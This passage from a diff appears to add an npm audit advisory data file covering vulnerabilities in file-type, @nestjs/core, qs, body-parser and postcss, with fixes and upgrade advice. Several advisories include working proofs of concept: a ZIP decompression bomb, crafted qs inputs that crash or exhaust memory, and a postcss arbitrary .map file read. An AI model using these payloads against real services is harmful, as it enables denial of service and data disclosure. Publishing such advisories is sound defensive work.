+      "updated": "2026-03-10T23:57:11.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-5v7r-6r5c-r473"
+    },
+    "1114726": {
+      "findings": [
+        {
+          "version": "20.4.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sindresorhus/file-type/security/advisories/GHSA-j47w-4g3g-c36v\n- https://github.com/sindresorhus/file-type/commit/a155cd71323279de173c54e8c530d300d3854fdd\n- https://github.com/sindresorhus/file-type/releases/tag/v21.3.2\n- https://nvd.nist.gov/vuln/detail/CVE-2026-32630\n- https://github.com/sindresorhus/file-type/commit/399b0f156063f5aeb1c124a7fd61028f3ea7c124\n- https://github.com/advisories/GHSA-j47w-4g3g-c36v",
+      "created": "2026-03-13T20:56:05.000Z",
+      "id": 1114726,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA crafted ZIP file can trigger excessive memory growth during type detection in `file-type` when using `fileTypeFromBuffer()`, `fileTypeFromBlob()`, or `fileTypeFromFile()`.\n\nIn affected versions, the ZIP inflate output limit is enforced for stream-based detection, but not for known-size inputs. As a result, a small compressed ZIP can cause `file-type` to inflate and process a much larger payload while probing ZIP-based formats such as OOXML. In testing on `file-type` `21.3.1`, a ZIP of about `255 KB` caused about `257 MB` of RSS growth during `fileTypeFromBuffer()`.\n\nThis is an availability issue. Applications that use these APIs on untrusted uploads can be forced to consume large amounts of memory and may become slow or crash.\n\n## Root Cause\n\nThe ZIP detection logic applied different limits depending on whether the tokenizer had a known file size.\n\nFor stream inputs, ZIP probing was bounded by `maximumZipEntrySizeInBytes` (`1 MiB`). For known-size inputs such as buffers, blobs, and files, the code instead used `Number.MAX_SAFE_INTEGER` in two relevant places:\n\n```js\nconst maximumContentTypesEntrySize = hasUnknownFileSize(tokenizer)\n\t? maximumZipEntrySizeInBytes\n\t: Number.MAX_SAFE_INTEGER;\n```\n\nand:\n\n```js\nconst maximumLength = hasUnknownFileSize(this.tokenizer)\n\t? maximumZipEntrySizeInBytes\n\t: Number.MAX_SAFE_INTEGER;\n```\n\nTogether, these checks allowed a crafted ZIP to bypass the intended inflate limit for known-size APIs and force large decompression during detection of entries such as `[Content_Types].xml`.\n\n## Proof of Concept\n\n```js\nimport {fileTypeFromBuffer} from 'file-type';\nimport archiver from 'archiver';\nimport {Writable} from 'node:stream';\n\nasync function createZipBomb(sizeInMegabytes) {\n\treturn new Promise((resolve, reject) => {\n\t\tconst chunks = [];\n\t\tconst writable = new Writable({\n\t\t\twrite(chunk, encoding, callback) {\n\t\t\t\tchunks.push(chunk);\n\t\t\t\tcallback();\n\t\t\t},\n\t\t});\n\n\t\tconst archive = archiver('zip', {zlib: {level: 9}});\n\t\tarchive.pipe(writable);\n\t\twritable.on('finish', () => {\n\t\t\tresolve(Buffer.concat(chunks));\n\t\t});\n\t\tarchive.on('error', reject);\n\n\t\tconst xmlPrefix = '<?xml version=\"1.0\"?><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">';\n\t\tconst padding = Buffer.alloc(sizeInMegabytes * 1024 * 1024 - xmlPrefix.length, 0x20);\n\t\tarchive.append(Buffer.concat([Buffer.from(xmlPrefix), padding]), {name: '[Content_Types].xml'});\n\t\tarchive.finalize();\n\t});\n}\n\nconst zip = await createZipBomb(256);\nconsole.log('ZIP size (KB):', (zip.length / 1024).toFixed(0));\n\nconst before = process.memoryUsage().rss;\nawait fileTypeFromBuffer(zip);\nconst after = process.memoryUsage().rss;\n\nconsole.log('RSS growth (MB):', ((after - before) / 1024 / 1024).toFixed(0));\n```\n\nObserved on `file-type` `21.3.1`:\n- ZIP size: about `255 KB`\n- RSS growth during detection: about `257 MB`\n\n## Affected APIs\n\nAffected:\n- `fileTypeFromBuffer()`\n- `fileTypeFromBlob()`\n- `fileTypeFromFile()`\n\nNot affected:\n- `fileTypeFromStream()`, which already enforced the ZIP inflate limit for unknown-size inputs\n\n## Impact\n\nApplications that inspect untrusted uploads with `fileTypeFromBuffer()`, `fileTypeFromBlob()`, or `fileTypeFromFile()` can be forced to consume excessive memory during ZIP-based type detection. This can degrade service or lead to process termination in memory-constrained environments.\n\n## Cause\n\nThe issue was introduced in 399b0f1",
+      "reported_by": null,
+      "title": "file-type: ZIP Decompression Bomb DoS via [Content_Types].xml entry",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-32630"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "file-type",
+      "vulnerable_versions": ">=20.0.0 <=21.3.1",
+      "github_advisory_id": "GHSA-j47w-4g3g-c36v",
+      "recommendation": "Upgrade to version 21.3.2 or later",
+      "patched_versions": ">=21.3.2",
+      "updated": "2026-03-16T21:59:51.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-409"
+      ],
+      "url": "https://github.com/advisories/GHSA-j47w-4g3g-c36v"
+    },
+    "1117063": {
+      "findings": [
+        {
+          "version": "10.4.22",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nestjs/nest/security/advisories/GHSA-36xv-jgw5-4q75\n- https://github.com/nestjs/nest/pull/16686\n- https://github.com/nestjs/nest/commit/83558ae774a990a7916141d3abe0b6548ff3a8b2\n- https://github.com/nestjs/nest/releases/tag/v11.1.18\n- https://nvd.nist.gov/vuln/detail/CVE-2026-35515\n- https://github.com/advisories/GHSA-36xv-jgw5-4q75",
+      "created": "2026-04-06T17:59:51.000Z",
+      "id": 1117063,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\n[`SseStream._transform()`](https://github.com/nestjs/nest/blob/dea5279ef8fcb568de158003e4281759a2cd7675/packages/core/router/sse-stream.ts) interpolates `message.type` and `message.id` directly into Server-Sent Events text protocol output without sanitizing newline characters (`\\r`, `\\n`). Since the SSE protocol treats both `\\r` and `\\n` as field delimiters and `\\n\\n` as event boundaries, an attacker who can influence these fields through upstream data sources can inject arbitrary SSE events, spoof event types, and corrupt reconnection state. Spring Framework's own security patch ([6e97587](https://github.com/spring-projects/spring-framework/commit/6e9758700a4946be1dca85ca937ef2603e291301)) validates these same fields (`id`, `event`) for the same reason.\n\nActual impact:\n\n- **Event spoofing**: Attacker forges SSE events with arbitrary `event:` types, causing client-side `EventSource.addEventListener()` callbacks to fire for wrong event types.\n- **Data injection**: Attacker injects arbitrary `data:` payloads, potentially triggering XSS if the client renders SSE data as HTML without sanitization.\n- **Reconnection corruption**: Attacker injects `id:` fields, corrupting the `Last-Event-ID` header on reconnection, causing the client to miss or replay events.\n- **Attack precondition**: Requires the developer to map user-influenced data to the `type` or `id` fields of SSE messages. Direct HTTP request input does not reach these fields without developer code bridging the gap.\n-\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nPatched in `@nestjs/core@11.1.18`",
+      "reported_by": null,
+      "title": "@nestjs/core Improperly Neutralizes Special Elements in Output Used by a Downstream Component ('Injection')",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-35515"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@nestjs/core",
+      "vulnerable_versions": "<=11.1.17",
+      "github_advisory_id": "GHSA-36xv-jgw5-4q75",
+      "recommendation": "Upgrade to version 11.1.18 or later",
+      "patched_versions": ">=11.1.18",
+      "updated": "2026-04-24T20:46:24.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-74"
+      ],
+      "url": "https://github.com/advisories/GHSA-36xv-jgw5-4q75"
+    },
+    "1119502": {
+      "findings": [
+        {
+          "version": "6.14.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-q8mj-m7cp-5q26\n- https://nvd.nist.gov/vuln/detail/CVE-2026-8723\n- https://github.com/ljharb/qs/commit/21f80b33e5c8b3f7eba1034fff0da4a4a37a1d41\n- https://github.com/advisories/GHSA-q8mj-m7cp-5q26",
+      "created": "2026-05-22T17:27:19.000Z",
+      "id": 1119502,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs.stringify` throws `TypeError` when called with `arrayFormat: 'comma'` and `encodeValuesOnly: true` on an array containing `null` or `undefined`. The throw is synchronous and not handled by any of qs's null-related options (`skipNulls`, `strictNullHandling`).\n\n### Details\n\nIn the comma + `encodeValuesOnly` branch, `lib/stringify.js:145` mapped the array through the raw encoder before joining:\n\n```js\nobj = utils.maybeMap(obj, encoder);\n```\n\n`utils.encode` (`lib/utils.js:195`) reads `str.length` with no null guard, so a `null` or `undefined` element throws `TypeError`. `skipNulls` and `strictNullHandling` are both checked in the per-element loop below this line and never get a chance to run.\n\nSame class of bug as the filter-array path fixed in 0c180a4. The vulnerable shape of the comma + `encodeValuesOnly` branch was introduced in 4c4b23d (\"encode comma values more consistently\", PR #463, 2023-01-19), first released in v6.11.1.\n\n#### PoC\n\n```js\nconst qs = require('qs');\n\nqs.stringify({ a: [null, 'b'] },      { arrayFormat: 'comma', encodeValuesOnly: true });\nqs.stringify({ a: [undefined, 'b'] }, { arrayFormat: 'comma', encodeValuesOnly: true });\nqs.stringify({ a: [null] },           { arrayFormat: 'comma', encodeValuesOnly: true });\n// TypeError: Cannot read properties of null (reading 'length')\n//     at encode (lib/utils.js:195:13)\n//     at Object.maybeMap (lib/utils.js:322:37)\n//     at stringify (lib/stringify.js:145:25)\n```\n\n#### Fix\n\n`lib/stringify.js:145`, applied in 21f80b3 on `main`:\n\n```diff\n- obj = utils.maybeMap(obj, encoder);\n+ obj = utils.maybeMap(obj, function (v) {\n+     return v == null ? v : encoder(v);\n+ });\n```\n\n`null` and `undefined` now pass through `maybeMap` unchanged and reach the `join(',')` step as-is. For `{ a: [null, 'b'] }` this produces `a=,b`, matching the non-`encodeValuesOnly` comma path (which already joins before encoding and produces `a=%2Cb` for the same input). Single-element `[null]` arrays still collapse via the existing `obj.join(',') || null` and remain subject to `skipNulls` / `strictNullHandling` in the main loop.\n\n### Affected versions\n\n`>=6.11.1 <=6.15.1`\n\nThe vulnerable code shape was introduced in 4c4b23d and first shipped in v6.11.1. Earlier versions — including all of 6.7.x, 6.8.x, 6.9.x, 6.10.x, and 6.11.0 — implemented the comma + `encodeValuesOnly` path differently (joining before encoding) and are not affected. Empirically verified across released versions.\n\n### Impact\n\nApplication code that calls `qs.stringify` with both `arrayFormat: 'comma'` and `encodeValuesOnly: true` (both non-default) on input that may contain a `null` or `undefined` array element will throw synchronously instead of producing a query string. In a typical Node.js HTTP framework (Express, Fastify, Koa, hapi) the sync throw is caught by the framework's error boundary and the affected request returns a 500; the worker process does not exit and subsequent requests are unaffected. The \"kills the worker process\" framing applies only to call sites outside a request-handler error boundary (background jobs, startup paths, stream pipelines) or to deployments with framework error handling explicitly disabled.\n\nThe vulnerable input is a `null` or `undefined` entry inside an array; this is reachable from JSON request bodies or from application code constructing arrays from user input, but not from standard HTML form submissions (which produce strings or omitted fields, not literal `null`).",
+      "reported_by": null,
+      "title": "qs has a remotely triggerable DoS: qs.stringify crashes with TypeError on null/undefined entries in comma-format arrays when encodeValuesOnly is set",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-8723"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=6.11.1 <=6.15.1",
+      "github_advisory_id": "GHSA-q8mj-m7cp-5q26",
+      "recommendation": "Upgrade to version 6.15.2 or later",
+      "patched_versions": ">=6.15.2",
+      "updated": "2026-05-22T17:27:20.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-476"
+      ],
+      "url": "https://github.com/advisories/GHSA-q8mj-m7cp-5q26"
+    },
+    "1123977": {
+      "findings": [
+        {
+          "version": "1.20.4",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/body-parser/security/advisories/GHSA-v422-hmwv-36x6\n- https://nvd.nist.gov/vuln/detail/CVE-2026-12590\n- https://github.com/expressjs/body-parser/pull/698\n- https://github.com/expressjs/body-parser/pull/741\n- https://github.com/expressjs/body-parser/commit/2322e111cc321413ec2b7b76d01be533d3de9d7d\n- https://github.com/expressjs/body-parser/commit/3492672eee593d5c158f239b6e9115498a5dbeac\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/body-parser/releases/tag/1.20.6\n- https://github.com/expressjs/body-parser/releases/tag/v2.3.0\n- https://github.com/advisories/GHSA-v422-hmwv-36x6",
+      "created": "2026-07-20T23:23:26.000Z",
+      "id": 1123977,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen body-parser is configured with an invalid `limit` option value, such as an unparseable string or `NaN`, `bytes.parse()` returns `null` and the request body size check is silently skipped. Applications that rely on `limit` as their primary safeguard against oversized request bodies will accept arbitrarily large payloads, leading to excessive memory and CPU usage and denial of service.\n\nThis issue affects applications that pass a programmatically computed or user-configurable value to the `limit` option without validating it first.\n\n### Patches\n\nThis issue is fixed in [body-parser@2.3.0](https://github.com/expressjs/body-parser/releases/tag/v2.3.0) and [body-parser@1.20.6](https://github.com/expressjs/body-parser/releases/tag/v1.20.6) via [#698](https://github.com/expressjs/body-parser/pull/698). After the fix, invalid `limit` values throw a clear error at parser construction time instead of silently disabling enforcement. `null` and `undefined` continue to fall back to the default limit (`100kb`).\n\n### Workarounds\n\nValidate `limit` before passing it to body-parser. For example, parse the value with [`bytes.parse()`](https://github.com/visionmedia/bytes.js) at startup and reject any configuration where it returns `null` or a non-finite number.\n\n### References\n\n- [#698](https://github.com/expressjs/body-parser/pull/698): fix PR\n- [bytes.js](https://github.com/visionmedia/bytes.js): limit parser",
+      "reported_by": null,
+      "title": "body-parser vulnerable to denial of service when invalid limit value silently disables size enforcement",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-12590"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "body-parser",
+      "vulnerable_versions": "<1.20.6",
+      "github_advisory_id": "GHSA-v422-hmwv-36x6",
+      "recommendation": "Upgrade to version 1.20.6 or later",
+      "patched_versions": ">=1.20.6",
+      "updated": "2026-07-20T23:23:28.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-v422-hmwv-36x6"
+    },
+    "1130709": {
+      "findings": [
+        {
+          "version": "8.5.22",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-fxqj-rqcc-2cmp\n- https://github.com/postcss/postcss/commit/7beca139e70f9075c6b19700fcb00dd8033e5da8\n- https://github.com/postcss/postcss/releases/tag/8.5.19\n- https://github.com/advisories/GHSA-fxqj-rqcc-2cmp",
+      "created": "2026-08-03T17:11:39.000Z",
+      "id": 1130709,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe fix for GHSA-6g55-p6wh-862q added a guard in `lib/previous-map.js` `PreviousMap.loadFile()` that restricts an attacker-controlled `sourceMappingURL` (from a CSS comment) to a `.map` extension and, for untrusted maps, rejects `..` traversal and absolute paths. The traversal/absolute rejection is nested inside `if (cssFile) { ... }`. When PostCSS is invoked without the `from` option, `cssFile` is falsy and that branch is skipped, leaving only the `.map` extension check.\n\n`PreviousMap` is constructed by `lib/input.js` whenever `pathAvailable && sourceMapAvailable` (under Node with source-map available), independent of `opts.from`/`opts.map` (the constructor returns early only for `opts.map === false`). So `postcss([]).process(css)` on attacker CSS reaches `loadFile` with `cssFile` undefined, and an attacker `/*# sourceMappingURL=/abs/path/x.map */` (or `../`-traversing path) is read via `readFileSync`. When the file is valid JSON, its `sources` (filesystem paths) and `sourcesContent` (source contents) are disclosed in the generated source map.\n\n## Affected code (v8.5.22 — the release carrying the GHSA-6g55 fix)\n\n```js\n// lib/previous-map.js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (cssFile) {                       // guard runs ONLY when `from` is set\n      let relativePath = relative(dirname(cssFile), path)\n      if (relativePath === '..' ||\n          relativePath.startsWith('..' + sep) ||\n          isAbsolute(relativePath)) {\n        return undefined\n      }\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()   // sink\n  }\n}\n\n// loadMap(): untrusted annotation path, trusted=false; file === opts.from\n} else if (this.annotation) {\n  let map = this.annotation\n  if (file) map = join(dirname(file), map)   // no `from` -> map stays the raw URL\n  let unknown = this.loadFile(map, file, false)  // file undefined -> cssFile falsy\n```\n\n## Proof of concept (verified on postcss 8.5.22)\n\n```js\nconst postcss = require('postcss')\nconst fs = require('fs')\n\n// a 'secret' sourcemap OUTSIDE any expected tree (stand-in for another project's .map)\nconst secret = '/tmp/pcpoc/secret_out_of_tree.map'\nfs.writeFileSync(secret, JSON.stringify({\n  version: 3, sources: ['/etc/REAL_PATH_LEAK'], mappings: '', names: [],\n  sourcesContent: ['TOP_SECRET_abcdef']\n}))\n\nconst css = 'a{color:red}\\n/*# sourceMappingURL=' + secret + ' */'\nconst leaks = m => m && JSON.stringify(m.toJSON ? m.toJSON() : m).includes('TOP_SECRET_abcdef')\n\n;(async () => {\n  // A) NO `from`  -> guard skipped -> arbitrary absolute .map read + disclosed\n  const a = await postcss([]).process(css, { map: true })\n  console.log('no from   -> leaked:', !!leaks(a.map))   // true\n\n  // B) WITH `from` -> guard active -> blocked\n  const b = await postcss([]).process(css, { from: '/tmp/pcpoc/in.css', map: true })\n  console.log('with from -> leaked:', !!leaks(b.map))    // false\n})()\n```\n\nObserved output on postcss 8.5.22:\n\n```\nno from   -> leaked: true      # sourcesContent 'TOP_SECRET_abcdef' AND sources '/etc/REAL_PATH_LEAK' appear in result.map\nwith from -> leaked: false     # guard rejects the absolute path\n```\n\n`../` traversal (no `from`) also succeeds; non-`.map` targets (`.txt`, `?x=.map`, `#.map`) are blocked by the `.map` check. The tested build contains the GHSA-6g55 fix (`this.json = JSON.parse(...)` in `loadMap`, `consumer()` uses `this.json || this.text`), so this is a residual of that fix.\n\n## Impact\n\nArbitrary `.map`-file read (absolute path or `../` traversal) and disclosure of the target map's `sources` (local filesystem paths) and `sourcesContent` (source) into the generated source map, for any consumer that runs PostCSS on attacker-influenced CSS without a `from` option and exposes `result.map` (online CSS playgrounds, minify/lint services, string-input build steps). Bounded to files ending in `.map` that parse as JSON.\n\n## Suggested fix\n\nApply the traversal/absolute-path rejection to the untrusted map path regardless of whether `cssFile` is present (resolve against `process.cwd()` when there is no `cssFile`, and reject absolute paths and `..` escape in all untrusted cases), or refuse to load an untrusted external map when no base file is known.",
+      "reported_by": null,
+      "title": "PostCSS: incomplete fix of GHSA-6g55-p6wh-862q — attacker-controlled sourceMappingURL reads arbitrary .map files when `from` is unset",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-69153"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.22",
+      "github_advisory_id": "GHSA-fxqj-rqcc-2cmp",
+      "recommendation": "Upgrade to version 8.5.23 or later",
+      "patched_versions": ">=8.5.23",
+      "updated": "2026-08-03T17:11:40.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-fxqj-rqcc-2cmp"
+    },
+    "1158506": {
+      "findings": [
+        {
+          "version": "6.15.3",
+          "paths": []
+        },
+        {
+          "version": "6.14.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883\n- https://github.com/ljharb/qs/security/advisories/GHSA-x5fp-wj9c-mxmx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82562\n- https://github.com/ljharb/qs/commit/8859c37470e11b42b547b275e4e9bd0bc8cc5464\n- https://github.com/advisories/GHSA-x5fp-wj9c-mxmx",
+      "created": "2026-09-02T14:46:57.000Z",
+      "id": 1158506,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs` `v6.15.3` allows bracket-key input to bypass `arrayLimit` and `throwOnLimitExceeded` when `comma: true`. The input `a[]=1,2,3,4` succeeds with `arrayLimit: 3`, while the equivalent plain-key input is rejected.\n\nAffected version tested:\n\n```text\nqs v6.15.3\ncommit 18d085e919dae70c8f1b200ab99323058edab2c2\n```\n\n### Details\n\n`parseArrayValue()` enforces the comma limit only for flat values. The `a[]` form is marked non-flat, so its comma-separated value is wrapped after parsing and the inner array is not checked. A single parameter can therefore materialize arbitrarily large arrays.\n\n### PoC\n\n```js\nconst qs = require('qs')\nconst options = { comma: true, arrayLimit: 3, throwOnLimitExceeded: true }\n\nconst result = qs.parse('a[]=1,2,3,4', options)\nconsole.log(result.a[0].length) // 4; expected RangeError\n\nconst big = qs.parse('a[]=' + '1,'.repeat(1000000) + '1', { comma: true, arrayLimit: 20 })\nconsole.log(big.a[0].length) // 1000001\n```\n\nOn `v6.15.3`, the first input parses successfully and the second creates an array with 1,000,001 elements. The equivalent `a=1,2,3,4` input throws `RangeError` as expected.\n\n### Impact\n\nAn attacker who can supply a query string or form body can bypass configured array limits and force excessive memory allocation, causing denial of service. The limit must be applied after comma splitting and before the resulting array is wrapped.",
+      "reported_by": null,
+      "title": "qs array-limit bypass via bracket-key comma parsing",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82562"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=6.14.2 <=6.15.3",
+      "github_advisory_id": "GHSA-x5fp-wj9c-mxmx",
+      "recommendation": "Upgrade to version 6.16.0 or later",
+      "patched_versions": ">=6.16.0",
+      "updated": "2026-09-02T14:46:58.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-x5fp-wj9c-mxmx"
+    },
+    "1158507": {
+      "findings": [
+        {
+          "version": "6.15.3",
+          "paths": []
+        },
+        {
+          "version": "6.14.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-4mjr-xmp4-gh2g\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82417\n- https://github.com/ljharb/qs/commit/e83d321ffafb38cf210683ac31714fce6ce1c6c6\n- https://github.com/advisories/GHSA-4mjr-xmp4-gh2g",
+      "created": "2026-09-02T14:45:13.000Z",
+      "id": 1158507,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset — via `qs`'s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor && obj.constructor.isBuffer && obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` — pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` — the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` — worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse->stringify -> TypeError\nnode poc02_isBuffer.js                      # minimal defect -> TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -> uncaught throw -> exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' && typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.",
+      "reported_by": null,
+      "title": "qs: Denial of Service via Attacker Controlled isBuffer",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82417"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=2.2.5 <6.16.0",
+      "github_advisory_id": "GHSA-4mjr-xmp4-gh2g",
+      "recommendation": "Upgrade to version 6.16.0 or later",
+      "patched_versions": ">=6.16.0",
+      "updated": "2026-09-02T14:45:15.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-4mjr-xmp4-gh2g"
+    },
+    "1193670": {
+      "findings": [
